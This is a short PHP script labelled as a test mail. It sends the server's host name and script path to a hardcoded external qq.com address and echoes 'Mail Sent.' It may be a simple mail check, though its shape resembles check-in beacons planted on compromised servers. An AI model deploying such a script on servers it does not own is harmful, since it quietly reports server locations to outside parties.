<?php
$d = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$to = "1978934863@qq.com";
$subject = "Test mail - ".$d;
$message = "Hello! This is a simple email message. - ".$d;
$from = "2259650891@qq.com";
$headers = "From: $from";
mail($to,$subject,$message,$headers);
echo "<title>Mail Sent.</title><br/>Mail Sent.<br/".$d;

?>